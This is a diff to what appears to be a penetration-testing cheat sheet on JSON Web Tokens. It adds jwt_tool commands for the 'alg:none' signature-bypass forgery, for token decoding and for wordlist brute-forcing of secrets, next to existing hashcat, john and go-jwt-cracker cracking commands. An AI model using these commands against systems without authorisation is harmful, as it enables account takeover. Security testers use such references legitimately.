@@ -1513,8 +1513,16 @@ https://jwt.io/
 `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0`  
 2. Forge the payload content  
 3. Leave the Signature part of the JWT empty and put a period in the token  
-	
+or  
+-> jwt_tool  
+```
+jwt_tool <jwt> -X a 
+```
 ### JWT Decoder
+-> jwt_tool  
+```
+jwt_tool <JWT>
+```
 -> jwt-decoder.py  
 ```
 python3 jwt-decoder.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J1YqLEv9ypAApz27nfYP5L4"
@@ -1522,6 +1530,13 @@ python3 jwt-decoder.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.
 https://github.com/mazen160/jwt-pwn  
 
 ### JWT Cracking - Brute-Force
+-> crunch + jwt_tool
+```
+crunch 5 5 -o wl.txt
+```
+```
+jwt_tool <jwt> -C -d wl.txt
+```
 -> go-jwt-cracker  
 ```
 ./go-jwt-cracker -wordlist /pentest/wordlist.txt -token "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J1YqLEv9ypAApz27nfYP5L4"
@@ -1537,13 +1552,6 @@ hashcat jwt.txt -m 16500 -a 3 -w 2 ?d?d?d?d
 ```
 john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256
 ```
-
-### Other Tools
--> jwt_tool.py   
-```
-python3 jwt_tool.py <JWT>
-```
-https://github.com/ticarpi/jwt_tool
 
 #### Docs
 https://rodolfomarianocy.medium.com/jwt-token-entenda-do-ponto-de-vista-defensivo-e-ofensivo-1aad6406de53
